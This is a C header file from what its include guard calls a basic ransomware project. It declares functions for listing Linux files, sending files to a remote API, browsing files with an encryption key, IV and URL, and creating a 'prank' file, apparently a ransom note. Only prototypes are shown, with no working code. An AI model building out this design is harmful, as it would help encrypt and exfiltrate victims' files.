//
//
//

#ifndef BASIC_C_RANSOMWARE_FILES_H
#define BASIC_C_RANSOMWARE_FILES_H

typedef struct {
    char **paths;
    size_t count;
    size_t capacity;
} PathList;

void freePathList(PathList *pathList);
void addToPathList(PathList *pathList, const char *path);
void initPathList(PathList *pathList);
void linuxListFiles(const char *path, PathList *pathList);

void sendFileToApi(const char *path, const char *id, const char *api);
char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
void write_to_file(char *filename, char *value, int size);
void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);
void create_prank_file(const char *key);

#endif //BASIC_C_RANSOMWARE_FILES_H
